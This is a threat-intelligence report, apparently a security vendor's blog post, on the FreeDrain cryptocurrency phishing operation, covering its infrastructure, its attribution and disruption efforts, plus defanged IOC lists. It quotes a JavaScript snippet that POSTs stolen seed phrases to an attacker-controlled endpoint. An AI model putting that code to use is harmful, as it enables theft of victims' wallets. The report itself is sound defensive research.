<figure id="attachment_121018" aria-describedby="caption-attachment-121018" style="width: 1535px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_19.jpg" alt="DNS history for scientcontopped[.]com prior to expiration (2024)" width="1535" height="933" class="size-full wp-image-121018" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_19.jpg 1535w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_19-300x182.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_19-1024x622.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_19-768x467.jpg 768w" sizes="auto, (max-width: 1535px) 100vw, 1535px" /><figcaption id="caption-attachment-121018" class="wp-caption-text">DNS history for <em>scientcontopped[.]com</em> prior to expiration (2024)</figcaption></figure>
<p>The domain resolved to only a handful of IPs over its active life suggesting stable, centralized hosting infrastructure.</p>
<p>Pivoting on IP addresses shared by these older FreeDrain domains revealed that there are hundreds of other domain names that share nearly identical characteristics in terms of naming conventions, registration patterns, and hosting patterns. Yet, these other domains didn’t exhibit direct ties to FreeDrain behavior.</p>
<figure id="attachment_121021" aria-describedby="caption-attachment-121021" style="width: 1526px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_16.jpg" alt="Pivot from confirmed FreeDrain redirector (yellow asterisk) reveals broader domain ecosystem with matching infrastructure traits" width="1526" height="942" class="size-full wp-image-121021" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_16.jpg 1526w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_16-300x185.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_16-1024x632.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_16-768x474.jpg 768w" sizes="auto, (max-width: 1526px) 100vw, 1526px" /><figcaption id="caption-attachment-121021" class="wp-caption-text">Pivot from confirmed FreeDrain redirector (yellow asterisk) reveals broader domain ecosystem with matching infrastructure traits</figcaption></figure>
<p>This led us to two possibilities:</p>
<ol>
<li aria-level="1">The redirectors are part of a leased infrastructure-as-a-service model, used by FreeDrain and potentially many other threat actors</li>
<li aria-level="1">FreeDrain is a subdivision of a broader operation, with shared tooling and infrastructure but distinct campaigns</li>
</ol>
<p>At this stage, the full extent of this infrastructure and the relationships between campaigns remain an open research question. What is clear, however, is that FreeDrain does not operate in isolation, and the redirection layer may be a service used by multiple actors.</p>
<h2>Phishing Pages</h2>
<p>Across our monitoring, we observed dozens of variations in FreeDrain phishing pages but technically, they were all fairly simple and consistent in architecture.</p>
<p>These phishing pages were most often:</p>
<ul>
<li aria-level="1">Hosted on cloud infrastructure, primarily Amazon S3 and Azure Web AppsDesigned to mimic legitimate cryptocurrency wallet interfaces (Trezor, MetaMask, Ledger, etc.)</li>
<li aria-level="1">Implemented using HTML forms or AJAX POST requests to transmit stolen credentials to attacker-controlled endpoints</li>
</ul>
<figure id="attachment_121006" aria-describedby="caption-attachment-121006" style="width: 1594px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_7.jpg" alt="A typical FreeDrain phishing page served from an S3 bucket, delivering only static content" width="1594" height="915" class="size-full wp-image-121006" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_7.jpg 1594w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_7-300x172.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_7-1024x588.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_7-768x441.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_7-1536x882.jpg 1536w" sizes="auto, (max-width: 1594px) 100vw, 1594px" /><figcaption id="caption-attachment-121006" class="wp-caption-text">A typical FreeDrain phishing page served from an S3 bucket, delivering only static content</figcaption></figure>
<p>Some S3-hosted phishing sites sent harvested data to live backend services on Azure, as seen in multiple instances where form actions pointed to azurewebsites.net applications.</p>
<figure id="attachment_121020" aria-describedby="caption-attachment-121020" style="width: 860px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_17.jpg" alt="The form for an S3-hosted FreeDrain phishing page posts to “/send.php” running in Azure" width="860" height="240" class="size-full wp-image-121020" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_17.jpg 860w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_17-300x84.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_17-768x214.jpg 768w" sizes="auto, (max-width: 860px) 100vw, 860px" /><figcaption id="caption-attachment-121020" class="wp-caption-text">The form for an S3-hosted FreeDrain phishing page posts to <em>&#8220;/send.php&#8221;</em> running in Azure</figcaption></figure>
<h3>Human Operators Behind the Scenes</h3>
<p>While most pages used standard static phishing techniques, we occasionally encountered live chat widgets embedded in Azure-hosted phishing pages.</p>
<p>This chat feature had previously been documented in <a href="https://www.netskope.com/blog/attackers-continue-to-abuse-google-sites-and-microsoft-azure-to-host-cryptocurrency-phishing" target="_blank" rel="noopener noreferrer">a 2022 report by Netskope</a> (one of the few references we ever found to FreeDrain and the earliest reported). Our own interactions confirmed that humans, not bots, were responding to victim inquiries in real time, often providing reassurance or technical &#8220;help&#8221; to keep targets engaged.</p>
<figure id="attachment_121022" aria-describedby="caption-attachment-121022" style="width: 1505px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_15.jpg" alt="Live chat interaction on a phishing page hosted in Azure" width="1505" height="1134" class="size-full wp-image-121022" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_15.jpg 1505w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_15-300x226.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_15-1024x772.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_15-768x579.jpg 768w" sizes="auto, (max-width: 1505px) 100vw, 1505px" /><figcaption id="caption-attachment-121022" class="wp-caption-text">Live chat interaction on a phishing page hosted in Azure</figcaption></figure>
<h3>Clean, Unobfuscated Exfiltration Code</h3>
<p>In the malicious JavaScript that we observed that handled POST requests with stolen seed phrases, the code is well-formatted, commented, and does not appear to be obfuscated in any way. Full examples are provided in the appendix, but a snippet of the POST request is below (domain bolded and defanged):</p>
<pre>
const data = {};
inputs.forEach((input, index) => {
    data[`phrase${index}`] = input.value.trim();
});
data.subject = "Trezor connect2";
data.message = "Successfull fetch data";
$.ajax({
    type: "POST",
    url: "<b>https://rfhwuwixxi.execute-api.us-east-1.amazonaws[.]com/prod/eappmail</b>",
    dataType: "json",
    crossDomain: true,
    contentType: "application/json; charset=utf-8",
    data: JSON.stringify(data),
    success: function (result) {
        alert('Data submitted successfully1!');
        window.location.href = 'https://suite.trezor.io/web/';
        location.reload();
    },
    error: function (xhr, status, error) {
        window.location.href = 'https://suite.trezor.io/web/';
&nbsp;
&nbsp;
}
});
</pre>
<p>Despite its simplicity, the phishing backend was effective, disposable, and often difficult to trace—highlighting just how low the bar is for technical sophistication when paired with wide-scale reach and persistent lure infrastructure.</p>
<h2>Actor Analysis</h2>
<p>Attribution is inherently difficult when infrastructure is ephemeral and built on shared, free-tier services. Yet through a combination of repository metadata, behavioral signals, and timing artifacts, we were able to extract meaningful insights about FreeDrain&#8217;s operators, including likely location, working patterns, and their degree of operational coordination.</p>
<p>Our first major breakthrough came from GitHub Pages (<code>github.io</code>), which only allows hosting via a public repository that matches the account’s GitHub username (e.g., <code>username.github.io</code>). This constraint meant every active FreeDrain lure page hosted on GitHub had a publicly accessible repository behind it.</p>
<p>We cloned hundreds of these repositories and analyzed the commit metadata, including timestamps, usernames, email addresses, and whether commits were made via the CLI or web interface. Several clear patterns emerged:</p>
<ul>
<li aria-level="1">Email addresses were always unique, tied 1:1 with the GitHub account, and never reused.</li>
<li aria-level="1">All emails came from free providers like Gmail, Hotmail, Outlook, and ProtonMail.</li>
<li aria-level="1">While naming styles varied widely (capitalization, numbers, patterns), we found clusters of similarly structured addresses, suggesting manual creation by multiple individuals, possibly using shared templates or naming approach.</li>
</ul>
<figure id="attachment_121014" aria-describedby="caption-attachment-121014" style="width: 366px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_22.jpg" alt="Sample of email addresses found in FreeDrain-associated Github commit" width="366" height="632" class="size-full wp-image-121014" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_22.jpg 366w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_22-174x300.jpg 174w" sizes="auto, (max-width: 366px) 100vw, 366px" /><figcaption id="caption-attachment-121014" class="wp-caption-text">Sample of email addresses found in FreeDrain-associated Github commit</figcaption></figure>
<p>Importantly, GitHub commits preserve the local timezone of the user unless manually configured otherwise. In our dataset, over 99% of commits were timestamped in UTC+05:30 (Indian Standard Time), our first strong geographic indicator.</p>
<figure id="attachment_121008" aria-describedby="caption-attachment-121008" style="width: 886px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_5.jpg" alt="Over 99% of the commits analyzed were localized to UTC+05:30" width="886" height="511" class="size-full wp-image-121008" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_5.jpg 886w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_5-300x173.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_5-768x443.jpg 768w" sizes="auto, (max-width: 886px) 100vw, 886px" /><figcaption id="caption-attachment-121008" class="wp-caption-text">Over 99% of the commits analyzed were localized to UTC+05:30</figcaption></figure>
<p>We corroborated this signal using metadata from other FreeDrain free-infrastructure/services. Webflow, for instance, embeds a &#8220;last published&#8221; timestamp in the HTML source of hosted sites. When we aggregated timestamps across the many FreeDrain Webflow pages, a clear 9-to-5 weekday work pattern emerged, complete with a consistent midday break. This pattern aligns closely with a standard business schedule in the IST timezone.</p>
<figure id="attachment_121025" aria-describedby="caption-attachment-121025" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12.jpg" alt="Aggregated Webflow publish times show an exceptionally clear weekday work pattern in UTC+05:30" width="1999" height="1180" class="size-full wp-image-121025" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12-300x177.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12-1024x604.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12-768x453.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12-1536x907.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-121025" class="wp-caption-text">Aggregated Webflow publish times show an exceptionally clear weekday work pattern in UTC+05:30</figcaption></figure>
<figure id="attachment_121013" aria-describedby="caption-attachment-121013" style="width: 1055px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_23.jpg" alt="Webflow embeds publish timestamps into the HTML source code of published websites" width="1055" height="598" class="size-full wp-image-121013" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_23.jpg 1055w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_23-300x170.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_23-1024x580.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_23-768x435.jpg 768w" sizes="auto, (max-width: 1055px) 100vw, 1055px" /><figcaption id="caption-attachment-121013" class="wp-caption-text">Webflow embeds publish timestamps into the HTML source code of published websites</figcaption></figure>
<p>Combining these and other signals across platforms, we assess with high confidence that FreeDrain is operated by individuals based in the IST timezone, likely in India, working standard weekday hours.</p>
<p>Additionally, timeline analysis shows that FreeDrain has been active since at least 2022, with a notable acceleration in mid-2024. As of this writing, the campaign remains active across several free hosting and publishing platforms.</p>
<figure id="attachment_121011" aria-describedby="caption-attachment-121011" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25.jpg" alt="Confirmed “last published” times, by date" width="1999" height="1180" class="size-full wp-image-121011" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25-300x177.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25-1024x604.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25-768x453.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25-1536x907.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-121011" class="wp-caption-text">Confirmed “last published” times, by date</figcaption></figure>
<h2>Disruption Efforts and Opportunities</h2>
<p>The scale and diversity of services abused by FreeDrain made disruption an ongoing challenge. While the campaign leaned heavily on free-tier platforms, many of which allowed users to publish images, text, external links, and even custom JavaScript to subdomains under well-known parent domains, very few of these platforms offered streamlined abuse reporting workflows.</p>
<p>In most cases, there was no direct method to report malicious content from the content page itself, forcing us to manually investigate each platform’s policies, support forms, or contact channels. This adds unnecessary friction to the response process, especially when scaled across hundreds of active malicious pages.</p>
<p>Even more concerning, most of the publishing platforms lacked the detection capabilities to identify this type of coordinated abuse on their own. The indicators were there: repetitive naming patterns, clustered behavior, identical templates reused across subdomains, but limited proactive action was being taken.</p>
<p>This highlights a broader industry need:</p>
<ul>
<li>Free-tier content platforms should invest in basic abuse prevention tooling and more accessible reporting mechanisms.</li>
</ul>
<p>At minimum, this includes:</p>
<ul>
<li aria-level="1">Allowing abuse to be reported directly from published content pages</li>
<li aria-level="1">Monitoring for patterns of misuse (e.g., bulk account creation, similar domain structures, repeated hosting of external phishing kits)</li>
<li aria-level="1">Establishing direct communication lines with trusted threat intel analysts and threat researchers</li>
</ul>
<p>FreeDrain’s reliance on free-tier platforms is not unique, and without better safeguards, these services will continue to be weaponized at scale.</p>
<p>This isn’t just a security issue, it’s a business one. When threat actors abuse these platforms to host phishing pages, fake login portals, or crypto scams, they erode user trust in the entire platform domain. Over time, this leads to real financial consequences:</p>
<ul>
<li aria-level="1"><strong>Reputation damage:</strong> Reputable domain names like <code>webflow.io</code>, and <code>teachable.com</code> can quickly become flagged by corporate security tools, browser warning systems, and threat intelligence feeds. This reduces their utility for legitimate users and undermines the brand’s credibility.</li>
<li aria-level="1"><strong>Deliverability and discoverability</strong>: Once a platform’s domain is associated with widespread abuse, search engines, email providers, and social networks may down-rank or block links from that domain, hurting all users, including paying customers.</li>
<li aria-level="1"><strong>Customer churn and support burden</strong>: Abuse-driven issues often result in a higher volume of customer support tickets, complaints, and refunds, particularly when paying users find their content mistakenly flagged or blocked due to a shared domain reputation.</li>
<li aria-level="1"><strong>Increased infrastructure and fraud costs</strong>: Hosting abusive content, even at scale on free tiers, still consumes compute, storage, and bandwidth. Worse, it may attract waves of automated account signups and resource abuse that raise operational costs.</li>
</ul>
<p>Failing to detect and mitigate this kind of abuse isn’t just a user risk– it’s an unpaid tax on the business, dragging down growth and trust at every layer. Proactive abuse prevention and streamlined reporting are not just table stakes for security, they’re critical to long-term sustainability.</p>
<h2>References and Similarities to Other Campaigns</h2>
<p>Elements of the FreeDrain campaign were first publicly documented in <a href="https://www.netskope.com/blog/abusing-google-sites-and-microsoft-azure-for-crypto-phishing" target="_blank" rel="noopener noreferrer">August 2022 by Netskope</a>, with <a href="https://www.netskope.com/blog/attackers-continue-to-abuse-google-sites-and-microsoft-azure-to-host-cryptocurrency-phishing" target="_blank" rel="noopener noreferrer">a follow-up report</a> in September 2022. Netskope’s early findings captured the core tactics that continue today: leveraging SEO manipulation to drive traffic to lure pages, which then redirect to credential-harvesting phishing sites. Netskope also published another <a href="https://www.netskope.com/blog/attackers-target-crypto-wallets-using-codeless-webflow-phishing-pages" target="_blank" rel="noopener noreferrer">update in October 2024</a>, focusing on FreeDrain’s use of Webflow-hosted infrastructure, confirming the campaign’s continued evolution while retaining the same fundamental workflow.</p>
<p>FreeDrain’s abuse of legitimate free-tier platforms is part of a broader trend in phishing infrastructure, but it remains distinct from other well-known crypto phishing efforts. For example, the CryptoCore campaign, <a href="https://decoded.avast.io/martinchlumecky1/cryptocore-unmasking-the-sophisticated-cryptocurrency-scam-operations/" target="_blank" rel="noopener noreferrer">reported by Avast</a> in August 2024, similarly targets cryptocurrency users but relies heavily on YouTube content and impersonation videos to draw in victims, rather than search engine poisoning and static phishing sites.</p>
<p>In 2023, <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/its-raining-phish-and-scams-how-cloudflare-pages-dev-and-workers-dev-domains-get-abused/" target="_blank" rel="noopener noreferrer">Trustwave reported</a> on the use of Cloudflare’s pages.dev and workers.dev services in phishing, showing how modern hosting platforms that offer free, customizable subdomains with minimal friction are being systematically exploited, mirroring FreeDrain’s approach.</p>
<p>Recent reporting has also shed light on the kinds of threat actors that may be behind campaigns like FreeDrain. Just this week, the U.S. Treasury<a href="https://home.treasury.gov/news/press-releases/sb0129" target="_blank" rel="noopener noreferrer"> sanctioned individuals linked to cyber scam operations in Southeast Asia</a>, specifically a militia group in Burma involved in online fraud networks. While distinct from FreeDrain, these operations share similar hallmarks: large-scale abuse of online infrastructure, technical capability, and a focus on financial theft, demonstrating the scale and organization such campaigns can operate under.</p>
<p>FreeDrain’s techniques have also been informally documented by affected users. In particular, Trezor hardware wallet customers have reported fraudulent websites mimicking the Trezor ecosystem, some of which were part of FreeDrain’s infrastructure:</p>
<ul>
<li aria-level="1"><a href="https://forum.trezor.io/t/reporting-scam-site/20284" target="_blank" rel="noopener noreferrer">Forum report: Reporting scam site</a></li>
<li aria-level="1"><a href="https://forum.trezor.io/t/fake-trezor-websites/173/5" target="_blank" rel="noopener noreferrer">Forum discussion: Fake Trezor websites</a></li>
</ul>
<h2>Conclusion</h2>
<p>The FreeDrain network represents a modern blueprint for scalable phishing operations, one that thrives on free-tier platforms, evades traditional abuse detection methods, and adapts rapidly to infrastructure takedowns. By abusing dozens of legitimate services to host content, distribute lure pages, and route victims, FreeDrain has built a resilient ecosystem that’s difficult to disrupt and easy to rebuild.</p>
<p>Through detailed infrastructure analysis, repository metadata mining, and cross-platform behavioral correlations, we uncovered rare insights into the actors behind the campaign, including strong indicators that the operation is manually run by a group based in the UTC+05:30 timezone, working standard business hours. Despite this visibility, systemic weaknesses in reporting mechanisms and abuse detection have allowed FreeDrain to persist and even accelerate in 2024.</p>
<p>This is not just a FreeDrain problem. The broader ecosystem of free publishing platforms is being exploited in ways that disproportionately benefit financially motivated threat actors. Without stronger default safeguards, identity verification, or abuse response infrastructure, these services will continue to be abused, undermining user trust and inflicting real-world financial harm.</p>
<p>By exposing the scale and structure of the FreeDrain network, we hope this research will enable better platform-level defenses, more informed user education, and collaboration across the security community to limit the reach and longevity of operations like this.</p>
<h2>Indicators of Compromise and Relations</h2>
<p><a href="https://github.com/Validin/indicators/tree/master/FreeDrain" target="_blank" rel="noopener noreferrer">Full List of IOCs can be downloaded here</a>.</p>
<h3>FreeDrain Lure Pages</h3>
<p>Download Full List for over 40,000 URLs<br />
Sample:</p>
<p>https://metamaskchromextan.gitbook\.io/us<br />
https://suprt-ios-trzorhard.gitbook\.io/en-us<br />
https://bridge-tziuur.gitbook\.io/en-us<br />
https://auth-ledger-com-cdn.webflow\.io/<br />
https://start&#8212;leddger-cdn-auth.webflow\.io/<br />
https://help&#8211;ledgre-auth-us.webflow\.io/<br />
https://home-trezsor-start.gitbook\.io/en-us<br />
https://wlt-phantom-wlt.webflow\.io/<br />
https://bridge-cen-trezseer.gitbook\.io/en-us<br />
https://ledgerauth-wellat.webflow\.io/<br />
https://ledgerivwaselet-us.webflow\.io/<br />
https://extentrust.gitbook\.io/en-us<br />
https://truststextion.gitbook\.io/us<br />
https://apps-support&#8212;mettmask.gitbook\.io/us<br />
https://cobo-wallet-digital-cdm.webflow\.io/<br />
https://extension&#8211;metaamsk-info.gitbook\.io/us<br />
https://bridge-docs&#8211;trzc.gitbook\.io/en-us<br />
https://suite-trezoreio.gitbook\.io/us<br />
https://auth&#8211;io-coinbausehelp.gitbook\.io/us<br />
https://help-blockf-cdnn.teachable\.com/p/home</p>
<h3>FreeDrain Redirect Domains</h3>
<p>These are the redirector domains we directly observed leveraged by FreeDrain going back 3+ years.</p>
<p>affanytougees[.]com<br />
ameddingpersusan[.]com<br />
anicnicpriesert[.]com<br />
antressmirestos[.]com<br />
aparingupgger[.]com<br />
bildherrywation[.]com<br />
boutiondistan[.]com<br />
brasencewompture[.]com<br />
carefersoldidense[.]com<br />
causesconighty[.]com<br />
charweredrepicks[.]com<br />
chazineconally[.]com<br />
chierstimines[.]com<br />
chopedansive[.]com<br />
claredcarcing[.]com<br />
coadormertranegal[.]com<br />
coateethappallel[.]com<br />
comaincology[.]com<br />
coneryconstiny[.]com<br />
conkeyprowse[.]com<br />
coutioncargin[.]com<br />
coveryinting[.]com<br />
crefoxappecture[.]com<br />
curphytompared[.]com<br />
darylapsebaryanmar[.]com<br />
deconsorconsuperb[.]com<br />
disantumcomptions[.]com<br />
distrypromited[.]com<br />
escentdeveriber[.]com<br />
fladestateins[.]com<br />
flesterwisors[.]com<br />
forrofilecabelle[.]com<br />
gaiterimturches[.]com<br />
goestodos[.]com<br />
grawableaugespare[.]com<br />
gresesticparray[.]com<br />
guardawalle[.]com<br />
hunnerdimental[.]com<br />
issetheserepson[.]com<br />
lamothyadjuncan[.]com<br />
leatlyinsioning[.]com<br />
leavesnottered[.]com<br />
listationsomminder[.]com<br />
litnentschelds[.]com<br />
minarymacrefeat[.]com<br />
mingaryshestence[.]com<br />
nashiclehunded[.]com<br />
obiansvieller[.]com<br />
paticableharent[.]com<br />
penlabuseoribute[.]com<br />
peridneyperadebut[.]com<br />
pladamousaribached[.]com<br />
posectsinsive[.]com<br />
pringingsernel[.]com<br />
saverateaubtle[.]com<br />
scientcontopped[.]com<br />
screnceagrity[.]com<br />
searranksdeveal[.]com<br />
shotheatsgnovel[.]com<br />
sonyonsa[.]com<br />
stalitynotinium[.]com<br />
storsianpreemed[.]com<br />
swissborglogi[.]xyz<br />
teleedlescestable[.]com<br />
tirzrstartio[.]com<br />
topsorthynaveneur[.]com<br />
tralizetrulines[.]com<br />
trighlandcomping[.]com<br />
versaryconnedges[.]com<br />
walitykildsence[.]com<br />
wintrolancing[.]com</p>
<h3>Phishing URLs</h3>
<p>https://atomicwallet.azurewebsites[.]net/<br />
https://bietbutylogn.azurewebsites[.]net/<br />
https://biokefeiwltliv29gleed.azurewebsites[.]net/<br />
https://bitgetwalt.azurewebsites[.]net/<br />
https://bleuckfie-coins.azurewebsites[.]net/<br />
https://bleuckkfiecoins.azurewebsites[.]net/<br />
https://bleuickkfiescoins.azurewebsites[.]net/<br />
https://blocckfi-api.azurewebsites[.]net/<br />
https://blocikifi.azurewebsites[.]net/<br />
https://blockffiecoinas.azurewebsites[.]net/<br />
https://blockfi-api.azurewebsites[.]net/<br />
https://blockfiapp-apk.azurewebsites[.]net/<br />
https://blockfiicoins.azurewebsites[.]net/<br />
https://blockificoinz.azurewebsites[.]net/<br />
https://blockifiicoins.azurewebsites[.]net/<br />
https://blockkfi-api.azurewebsites[.]net/<br />
https://blockkfiapi-apk.azurewebsites[.]net/<br />
https://blockkkfifies.azurewebsites[.]net/<br />
https://bloickfie-app.azurewebsites[.]net/<br />
https://bloickfiicoins.azurewebsites[.]net/<br />
https://bloickkfieecoinss.azurewebsites[.]net/<br />
https://bloickkfieescoins876.azurewebsites[.]net/<br />
https://bloiickkfieecoinase.azurewebsites[.]net/<br />
https://blokfi-error.azurewebsites[.]net/<br />
https://blokkfiapp-api.azurewebsites[.]net/<br />
https://blokkifi.azurewebsites[.]net/<br />
https://bloockkfi-api.azurewebsites[.]net/<br />
https://blouckfi-api.azurewebsites[.]net/<br />
https://bluckfi-error.azurewebsites[.]net/<br />
https://bluckfilogn.azurewebsites[.]net/<br />
https://blueckficoinis.azurewebsites[.]net/<br />
https://bluickkfiecoins.azurewebsites[.]net/<br />
https://boloickfieecoins.azurewebsites[.]net/<br />
https://buloickkfieecoins876.azurewebsites[.]net/<br />
https://cbswlterliv487wlt.azurewebsites[.]net/<br />
https://cionbise-error.azurewebsites[.]net/<br />
https://cnbse13liv.s3.eu-north-1.amazonaws[.]com/index.html<br />
https://cobo-wallet.azurewebsites[.]net/<br />
https://cobowalletoffc.azurewebsites[.]net/<br />
https://cobowalletz.azurewebsites[.]net/<br />
https://coienebaiseerlivwlt02elisa.azurewebsites[.]net/<br />
https://coinibisasesn567.azurewebsites[.]net/<br />
https://dft0-hjgkd26-fkj.s3.us-east-1.amazonaws[.]com/index.html<br />
https://edgeronwlet.azurewebsites[.]net/<br />
https://edgersuwlet.azurewebsites[.]net/<br />
https://eedu0s-jhdc-osxza.s3.us-east-1.amazonaws[.]com/index.html<br />
https://en-ledger-cdn.azurewebsites[.]net/<br />
https://en-trezor-cdn-auth.azurewebsites[.]net/<br />
https://en-trezor-cdn.azurewebsites[.]net/<br />
https://errorciiobiosewds876.azurewebsites[.]net/<br />
https://errorcoibisaeseaenbaeb876.azurewebsites[.]net/<br />
https://errorlovblockfi876.azurewebsites[.]net/<br />
https://errorlovbloikcffie876.azurewebsites[.]net/<br />
https://errorlovbolockfiee987.azurewebsites[.]net/<br />
https://errorlovcobisaed786.azurewebsites[.]net/<br />
https://errorlovcoibioise876.azurewebsites[.]net/<br />
https://errorlovexdkekam879.azurewebsites[.]net/<br />
https://errorlovexds987.azurewebsites[.]net/<br />
https://errorlovtenizr987.azurewebsites[.]net/<br />
https://errorlovtrasenzjedsuties.azurewebsites[.]net/<br />
https://errorlovtreazezz876.azurewebsites[.]net/<br />
https://errorlovtrikmanen987.azurewebsites[.]net/<br />
https://errormetiamiasks876.azurewebsites[.]net/<br />
https://errormetismesk987.azurewebsites[.]net/<br />
https://errortreazeeasd-suties.azurewebsites[.]net/<br />
https://ertzirdnwwltliv.azurewebsites[.]net/<br />
https://exd98uswlterliv.azurewebsites[.]net/<br />
https://exdiusiwalet.azurewebsites[.]net/<br />
https://ezioron1wlet.azurewebsites[.]net/<br />
https://iotruzorsuite.azurewebsites[.]net/<br />
https://itrusttcepitalcoins.azurewebsites[.]net/<br />
https://kaikzx-slsld39-lkjf.s3.us-east-1.amazonaws[.]com/index.html<br />
https://krakenzcoins.azurewebsites[.]net/<br />
https://ladzearwlt03jokesmko.azurewebsites[.]net/<br />
https://ldr-0gr-dsxz.s3.us-east-1.amazonaws[.]com/index.html<br />
https://leddgeircoins.azurewebsites[.]net/<br />
https://leddgersacoins.azurewebsites[.]net/<br />
https://ledeagderwallet.azurewebsites[.]net/<br />
https://ledg-01jghe0fhdk.s3.eu-north-1.amazonaws[.]com/index.html<br />
https://ledgar-live-walliet.s3.us-east-2.amazonaws[.]com/index.html<br />
https://ledger-start-403.azurewebsites[.]net/<br />
https://ledger-start-api.azurewebsites[.]net/<br />
https://ledgercoinserror3.azurewebsites[.]net/<br />
https://ledgercoinsweb3.azurewebsites[.]net/<br />
https://ledgersapi-apk.azurewebsites[.]net/<br />
https://ledgersapp.azurewebsites[.]net/<br />
https://ledgirlvestart.azurewebsites[.]net/<br />
https://ledigerwaliteasee.azurewebsites[.]net/<br />
https://ledzaererwltliv30mariamon.azurewebsites[.]net/<br />
https://ledzor365livwlter.azurewebsites[.]net/<br />
https://legdrlievlgin.azurewebsites[.]net/<br />
https://leidgeierwalitese.azurewebsites[.]net/<br />
https://leidgirscoinsweb.azurewebsites[.]net/<br />
https://leldger-live.azurewebsites[.]net/<br />
https://lezor3021sxes.azurewebsites[.]net/<br />
https://lfg0-oiosh-hdh.s3.us-east-1.amazonaws[.]com/index.html<br />
https://lgnwltcnbsliv.azurewebsites[.]net/<br />
https://lledgerwallest.azurewebsites[.]net/<br />
https://lzr13wlt.s3.eu-north-1.amazonaws[.]com/index.html<br />
https://metamaskdn.azurewebsites[.]net/<br />
https://metamasksrs.azurewebsites[.]net/<br />
https://metamassk.azurewebsites[.]net/<br />
https://mmetamassk.azurewebsites[.]net/<br />
https://mtmsklivwlter57wlt.azurewebsites[.]net/<br />
https://ndaaxscoins.azurewebsites[.]net/<br />
https://ndaxcoins.azurewebsites[.]net/<br />
https://ndeauxcoinsweb.azurewebsites[.]net/<br />
https://neaiaxcoins.azurewebsites[.]net/<br />
https://oduisshweb3.azurewebsites[.]net/<br />
https://portal-treaeameaene876.azurewebsites[.]net/<br />
https://ra0-lkjd01-gfhjd.s3.eu-north-1.amazonaws[.]com/index.html<br />
https://relkd28-lokdyuj.s3.us-east-1.amazonaws[.]com/index.html<br />
https://sdfg0d28-djkfk.s3.us-east-1.amazonaws[.]com/index.html<br />
https://secuxwallet-api.azurewebsites[.]net/<br />
https://sjdhd29-oiuw0.s3.us-east-1.amazonaws[.]com/index.html<br />
https://sledegerwallet.azurewebsites[.]net/<br />
https://solflareewerror.azurewebsites[.]net/<br />
https://suiitewalettrzior.azurewebsites[.]net/<br />
